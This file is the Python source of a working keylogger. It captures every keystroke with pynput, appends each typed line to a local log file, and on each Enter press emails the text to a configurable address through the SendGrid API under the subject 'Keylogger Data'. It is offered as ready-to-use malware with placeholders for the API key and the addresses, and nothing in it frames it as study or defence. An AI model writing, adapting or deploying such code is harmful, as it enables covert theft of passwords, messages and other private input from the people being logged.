from pynput import keyboard
import os
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail

text = ''
file = open('log.txt', 'a')

# Set your SendGrid API key here
SENDGRID_API_KEY = 'replace with your api key here'


def email(recipient, message):
    global SENDGRID_API_KEY
    print('Sending email to ' + recipient + '...')
    message = Mail(
        from_email='replace with your email here',
        to_emails=recipient,
        subject='Keylogger Data',
        html_content=message)
    try:
        sg = SendGridAPIClient(SENDGRID_API_KEY)
        response = sg.send(message)
        print(response.status_code)
        print(response.body)
        print(response.headers)
    except Exception as e:
        print(str(e))


def keylog(key):
    global text
    if key == keyboard.Key.esc:
        file.close()
        exit()

    if key == keyboard.Key.backspace:
        text = text[:-1]
        return

    if key == keyboard.Key.space:
        text += ' '
        return

    if key == keyboard.Key.enter:
        email('replace with your reciver mail here', text)  # Change recipient email here
        file.write(text + "\n")
        file.flush()
        text = ''
        return

    text += str(key)[1:2]


with keyboard.Listener(on_press=keylog) as listener:
    listener.join()
